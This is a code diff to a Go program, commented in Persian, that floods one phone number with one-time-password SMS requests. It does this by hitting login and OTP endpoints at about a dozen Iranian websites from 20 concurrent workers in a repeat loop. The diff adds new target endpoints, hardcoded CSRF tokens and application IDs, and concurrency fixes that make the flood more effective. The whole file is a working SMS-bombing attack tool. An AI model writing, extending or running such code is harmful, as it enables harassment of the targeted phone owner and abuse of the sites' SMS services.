@@ -117,7 +117,12 @@ func sendJSONRequest(ctx context.Context, url string, payload map[string]interfa
 				fmt.Printf("\033[01;31m[-] Could not read response body for %s: %v\033[0m\n", url, readErr)
 			} else {
 				// Print body as string. Be cautious with large/binary responses.
-				fmt.Printf("\033[01;31m[-] Response Body for %s: %s\033[0m\n", url, string(bodyBytes))
+				// limit body print size to avoid flooding the console
+				bodyStr := string(bodyBytes)
+				if len(bodyStr) > 500 { // print only first 500 chars if very long
+					bodyStr = bodyStr[:500] + "..."
+				}
+				fmt.Printf("\033[01;31m[-] Response Body for %s: %s\033[0m\n", url, bodyStr)
 			}
 			// Send the error status code. No retry for server-side errors (>= 400).
 			ch <- resp.StatusCode
@@ -131,7 +136,6 @@ func sendJSONRequest(ctx context.Context, url string, payload map[string]interfa
 			return // Done with this API call, it was successful
 		}
 	}
-	// This part should ideally not be reached given the retry logic and returns inside the loop.
 }
 
 func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
@@ -205,8 +209,12 @@ func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *s
 			if readErr != nil {
 				fmt.Printf("\033[01;31m[-] Could not read response body for %s: %v\033[0m\n", url, readErr)
 			} else {
-				// Print body as string. Be cautious with large/binary responses.
-				fmt.Printf("\033[01;31m[-] Response Body for %s: %s\033[0m\n", url, string(bodyBytes))
+				// Print body as string, limit size
+				bodyStr := string(bodyBytes)
+				if len(bodyStr) > 500 {
+					bodyStr = bodyStr[:500] + "..."
+				}
+				fmt.Printf("\033[01;31m[-] Response Body for %s: %s\033[0m\n", url, bodyStr)
 			}
 			// Send the error status code. No retry for server-side errors (>= 400).
 			ch <- resp.StatusCode
@@ -220,7 +228,6 @@ func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *s
 			return // Done with this API call, it was successful
 		}
 	}
-	// This part should ideally not be reached
 }
 
 func main() {
@@ -281,29 +288,36 @@ func main() {
 
 	// ---- ایجاد Context با مهلت زمانی کلی ----
 	timeoutDuration := 5 * time.Minute // مهلت زمانی کلی (قابل تنظیم)
+	// ایجاد Context اصلی که با Ctrl+C یا رسیدن به مهلت زمانی لغو میشود
 	ctx, cancel := context.WithTimeout(context.WithCancel(context.Background()), timeoutDuration)
 	defer cancel() // مطمئن میشویم که cancel در پایان main فراخوانی میشود
+
 
 	signalChan := make(chan os.Signal, 1)
 	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)
 
+	// Goroutine برای دریافت سیگنال و لغو Context
 	go func() {
 		select {
 		case <-signalChan:
 			fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
-			cancel()
+			cancel() // لغو Context توسط سیگنال
 		case <-ctx.Done():
-			// Context به دلیل timeout یا دلیل دیگر لغو شده
+			// Context به دلیل timeout یا دلیل دیگر لغو شده، این goroutine هم خارج میشود.
 		}
 	}()
 
+	// کانالی برای ارسال کارها به Workerها
 	tasks := make(chan func(), repeatCount*40)
+	// تعداد Goroutineهای کارگر
 	numWorkers := 20
 
 	var wg sync.WaitGroup
+	// کانال برای دریافت وضعیت‌ها (کدهای وضعیت HTTP یا 0 برای لغو)
 	ch := make(chan int, repeatCount*40)
 
 	// ایجاد و اجرای Goroutineهای کارگر
+	// هر کارگر از کانال tasks میخونه و تابع task() رو اجرا میکنه تا زمانی که کانال بسته بشه و خالی بشه یا Context لغو بشه
 	for i := 0; i < numWorkers; i++ {
 		go func() {
 			for task := range tasks {
@@ -311,27 +325,26 @@ func main() {
 				case <-ctx.Done():
 					return // خروج کارگر در صورت لغو Context
 				default:
-					task()
+					task() // اجرای وظیفه
 				}
 			}
 		}()
 	}
 
-	// حلقه اصلی برای تعریف و ارسال کارها به کانال tasks
+	// Goroutine برای تعریف و ارسال کارها به کانال tasks
 	go func() {
 		for i := 0; i < repeatCount; i++ {
 			select {
 			case <-ctx.Done():
 				fmt.Println("\033[01;33m[!] Task dispatching canceled.\033[0m")
-				goto endOfDispatch
+				goto endOfDispatch // پرش به برچسب endOfDispatch در صورت لغو Context
 			default:
+				// ادامه ارسال وظایف
 			}
 
-			// ---- API هایی که نیاز به بررسی بیشتر دارند ----
+			// ---- لیست API ها (بر اساس لیست قبلی شما) ----
 
-			// 1. api.achareh.co (JSON) - گزارش شده کار نکرده. Payload ساده است.
-			// احتمالات: نیاز به هدرهای خاص (مثل User-Agent, Origin)، یا اعتبارسنجی سمت سرور بر اساس IP یا شماره.
-			// برای عیب یابی: جزئیات درخواست در مرورگر (تب Network) را بررسی کنید.
+			// 1. api.achareh.co (JSON)
 			wg.Add(1)
 			tasks <- func() {
 				sendJSONRequest(ctx, "https://api.achareh.co/v2/accounts/login/?web=true", map[string]interface{}{
@@ -339,9 +352,43 @@ func main() {
 				}, &wg, ch)
 			}
 
-			// 5. api.timcheh.com (JSON) - گزارش شده کار نکرده. Payload ساده است.
-			// احتمالات: نیاز به هدرهای خاص، اعتبارسنجی سمت سرور، یا URL دقیقاً صحیح نیست.
-			// برای عیب یابی: جزئیات درخواست در مرورگر (تب Network) را بررسی کنید.
+			// 2. itmall.ir (Form) - مسیر wp-admin/admin-ajax.php معمولاً Form Data می پذیرد
+			wg.Add(1)
+			tasks <- func() {
+				formData := url.Values{}
+				formData.Set("action", "digits_check_mob")
+				formData.Set("countrycode", "+98")
+				formData.Set("mobileNo", phone)
+				formData.Set("csrf", "e57d035242") // ⚠️ توجه: این توکن ممکن است داینامیک باشد
+				formData.Set("login", "2")
+				formData.Set("username", "")
+				formData.Set("email", "")
+				formData.Set("captcha", "") // ⚠️ توجه: ممکن است نیاز به حل کپچا داشته باشد
+				formData.Set("captcha_ses", "")
+				formData.Set("json", "1")
+				formData.Set("whatsapp", "0")
+				sendFormRequest(ctx, "https://itmall.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
+			}
+
+			// 3. api.mootanroo.com (JSON)
+			wg.Add(1)
+			tasks <- func() {
+				sendJSONRequest(ctx, "https://api.mootanroo.com/api/v3/auth/fadce78fbac84ba7887c9942ae460e0c/send-otp", map[string]interface{}{
+					"PhoneNumber": phone,
+				}, &wg, ch)
+			}
+
+			// 4. accounts.khanoumi.com (Form) - ساختار payload شبیه Form Data است.
+			wg.Add(1)
+			tasks <- func() {
+				formData := url.Values{}
+				formData.Set("applicationId", "b92fdd0f-a44d-4fcc-a2db-6d955cce2f5e") // ⚠️ ممکن است نیاز به تولید دینامیک داشته باشد
+				formData.Set("loginIdentifier", phone)
+				formData.Set("loginSchemeName", "sms")
+				sendFormRequest(ctx, "https://accounts.khanoumi.com/account/login/init", formData, &wg, ch)
+			}
+
+			// 5. api.timcheh.com (JSON)
 			wg.Add(1)
 			tasks <- func() {
 				sendJSONRequest(ctx, "https://api.timcheh.com/auth/otp/send", map[string]interface{}{
@@ -349,9 +396,9 @@ func main() {
 				}, &wg, ch)
 			}
 
-			// 6. modiseh.com (Form) - گزارش شده کار نکرده. نیاز به توکن های داینامیک و احتمالاً کپچا دارد.
+			// 6. modiseh.com (Form) - نیاز به توکن های داینامیک و احتمالاً کپچا دارد.
 			// این API بدون پیاده سازی مکانیزم استخراج form_key, referer و حل کپچا از صفحه وب کار نخواهد کرد.
-			// ⚠️ این مورد نیاز به تغییرات پیشرفته تری دارد که فراتر از یک درخواست ساده است.
+			// ⚠️ این مورد نیاز به تغییرات پیشرفته تری دارد.
 			wg.Add(1)
 			tasks <- func() {
 				formData := url.Values{}
@@ -371,7 +418,7 @@ func main() {
 				sendFormRequest(ctx, "https://www.modiseh.com/customer/account/loginpost/", formData, &wg, ch)
 			}
 
-			// 7. shixon.com (Form) - گزارش شده کار نکرده. نیاز به توکن __RequestVerificationToken داینامیک دارد.
+			// 7. shixon.com (Form) - نیاز به توکن __RequestVerificationToken داینامیک دارد.
 			// این API بدون پیاده سازی مکانیزم استخراج __RequestVerificationToken از صفحه وب کار نخواهد کرد.
 			// ⚠️ این مورد نیاز به تغییرات پیشرفته تری دارد. فیلد "P" هم مشکوک است.
 			wg.Add(1)
@@ -385,9 +432,7 @@ func main() {
 				sendFormRequest(ctx, "https://www.shixon.com/Home/RegisterUser", formData, &wg, ch)
 			}
 
-			// 8. dast2.com (JSON) - گزارش شده کار نکرده. Payload ساده است. (طبق خروجی قبلی کار کرد)
-			// احتمالات: نیاز به هدرهای خاص، اعتبارسنجی سمت سرور.
-			// برای عیب یابی: جزئیات درخواست در مرورگر (تب Network) را بررسی کنید.
+			// 8. dast2.com (JSON)
 			wg.Add(1)
 			tasks <- func() {
 				sendJSONRequest(ctx, "https://dast2.com/token", map[string]interface{}{
@@ -395,9 +440,7 @@ func main() {
 				}, &wg, ch)
 			}
 
-			// 9. api.esam.ir (JSON) - گزارش شده کار نکرده. Payload شامل فیلدهای متعدد است. (طبق خروجی قبلی کار کرد)
-			// احتمالات: نیاز به هدرهای خاص، اعتبارسنجی سمت سرور، یا مشکل در فیلد serialNumber با مقدار خالی.
-			// برای عیب یابی: جزئیات درخواست در مرورگر (تب Network) و مستندات API (اگر موجود است) را بررسی کنید.
+			// 9. api.esam.ir (JSON)
 			wg.Add(1)
 			tasks <- func() {
 				sendJSONRequest(ctx, "https://api.esam.ir/api/account/v3/RegisterUserv3", map[string]interface{}{
@@ -408,7 +451,15 @@ func main() {
 				}, &wg, ch)
 			}
 
-			// 11. lioncomputer.com (Form) - گزارش شده کار نکرده. خطای Redirect میدهد.
+			// 10. mobapi.banimode.com (JSON)
+			wg.Add(1)
+			tasks <- func() {
+				sendJSONRequest(ctx, "https://mobapi.banimode.com/api/v2/auth/request", map[string]interface{}{
+					"phone": phone,
+				}, &wg, ch)
+			}
+
+			// 11. lioncomputer.com (Form) - خطای Redirect میدهد.
 			// این URL به احتمال زیاد نقطه پایانی صحیح برای دریافت مستقیم درخواست POST با این Payload نیست
 			// یا نیاز به هدرهای خاصی دارد که باعث عدم Redirect شود.
 			// ⚠️ این مورد نیاز به بررسی دقیق جریان لاگین در سایت و یافتن نقطه پایانی صحیح API دارد.
@@ -420,9 +471,7 @@ func main() {
 				sendFormRequest(ctx, "https://www.lioncomputer.com/api/v1/auth/send-register-code", formData, &wg, ch)
 			}
 
-			// 12. account.bama.ir (Form) - گزارش شده کار نکرده. Payload ساده است. (طبق خروجی قبلی کار کرد)
-			// احتمالات: نیاز به هدرهای خاص، اعتبارسنجی سمت سرور.
-			// برای عیب یابی: جزئیات درخواست در مرورگر (تب Network) را بررسی کنید.
+			// 12. account.bama.ir (Form)
 			wg.Add(1)
 			tasks <- func() {
 				formData := url.Values{}
@@ -431,37 +480,47 @@ func main() {
 				sendFormRequest(ctx, "https://account.bama.ir/api/otp/generate/v4", formData, &wg, ch)
 			}
 
-			// ---- اضافه کردن API های دیگری که قبلا کار می کردند (اختیاری) ----
+			// ---- در صورت تمایل API های دیگری که قبلا کار می کردند را اینجا اضافه کنید ----
 			// مثلا:
 			// wg.Add(1)
 			// tasks <- func() {
-			// 	sendJSONRequest(ctx, "https://api.pindo.ir/v1/user/login-register/", map[string]interface{}{
-			// 		"phone": phone,
+			// 	sendJSONRequest(ctx, "https://core.gapfilm.ir/api/v3.2/Account/Login", map[string]interface{}{
+			// 		"PhoneNo": phone,
 			// 	}, &wg, ch)
 			// }
-			// ... (بقیه API های کارا) ...
 
 
 		} // پایان select
 	} // پایان حلقه repeatCount
 
-	endOfDispatch: // برچسب برای پرش
+	endOfDispatch: // برچسب برای پرش goto
 		close(tasks) // بستن کانال tasks بعد از ارسال همه کارها یا لغو شدن context
 
 
-	// در یک Goroutine جداگانه منتظر اتمام کار Worker ها یا لغو Context
+	// Goroutine برای انتظار برای اتمام کار Worker ها (wg.Wait) یا لغو Context
 	go func() {
+		// ایجاد یک کانال کمکی برای اینکه wg.Wait() مسدود کننده را در select قرار ندهیم
+		waitDone := make(chan struct{})
+		go func() {
+			wg.Wait()
+			close(waitDone) // بستن کانال وقتی wg.Wait() تمام شد
+		}()
+
+		// منتظر لغو Context یا اتمام wg.Wait() می مانیم
 		select {
 		case <-ctx.Done():
 			fmt.Println("\033[01;33m[!] Waiting for WaitGroup interrupted by context.\033[0m")
-		case wg.Wait():
+		case <-waitDone:
 			fmt.Println("\033[01;32m[+] All tasks finished.\033[0m")
 		}
-		close(ch) // بستن کانال ch بعد از اتمام کارها یا لغو Context
+
+		// بستن کانال نتایج (ch) بعد از اتمام همه کارها یا لغو Context
+		close(ch)
 	}()
 
 	// پردازش کدهای وضعیت دریافت شده از کانال ch
 	fmt.Println("\033[01;34m[*] Processing results...\033[0m")
+	// این حلقه تا زمانی که کانال ch باز و خالی نیست، ادامه می یابد
 	for statusCode := range ch {
 		if statusCode >= 400 || statusCode == 0 { // کد وضعیت 0 برای درخواست های لغو شده توسط Context
 			// پیغام Error یا Canceled حالا جزئیات بیشتری در صورت وجود چاپ کرده است
